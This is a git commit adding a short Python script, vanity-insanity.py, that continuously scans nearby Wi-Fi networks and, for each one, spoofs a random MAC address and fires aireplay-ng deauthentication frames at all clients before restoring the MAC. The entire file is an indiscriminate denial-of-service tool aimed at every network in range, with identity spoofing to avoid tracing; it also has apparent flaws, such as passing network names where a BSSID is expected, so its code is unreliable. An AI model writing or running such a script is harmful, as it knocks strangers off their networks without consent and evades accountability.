5724286ae8d74c99a17abd426759caf25b6747b1
skiddo <30941141+coolst3r@users.noreply.github.com>
2023-03-17 22:03:17 +0200

    Create vanity-insanity.py

---
+++ vanity-insanity.py
@@ -0,0 +1,25 @@
+import subprocess
+import time
+import random
+import os
+
+def random_mac():
+    return ":".join([hex(random.randint(0x00, 0xff))[2:].zfill(2) for _ in range(6)])
+
+while True:
+    try:
+        output = subprocess.check_output(['iwlist', 'wlan0', 'scan'])
+        networks = [line.split(':')[1] for line in output.split('\n') if 'ESSID' in line]
+        for network in networks:
+            subprocess.call(['iwconfig', 'wlan0', 'mode', 'monitor'])
+            subprocess.call(['ifconfig', 'wlan0', 'down'])
+            subprocess.call(['macchanger', '-m', random_mac(), 'wlan0'])
+            subprocess.call(['ifconfig', 'wlan0', 'up'])
+            subprocess.call(['aireplay-ng', '-0', '2', '-a', network.strip(), '-c', 'FF:FF:FF:FF:FF:FF', '-D', 'wlan0'])
+            subprocess.call(['iwconfig', 'wlan0', 'mode', 'managed'])
+            subprocess.call(['ifconfig', 'wlan0', 'down'])
+            subprocess.call(['macchanger', '-p', 'wlan0'])
+            subprocess.call(['ifconfig', 'wlan0', 'up'])
+        time.sleep(1)
+    except KeyboardInterrupt:
+        break
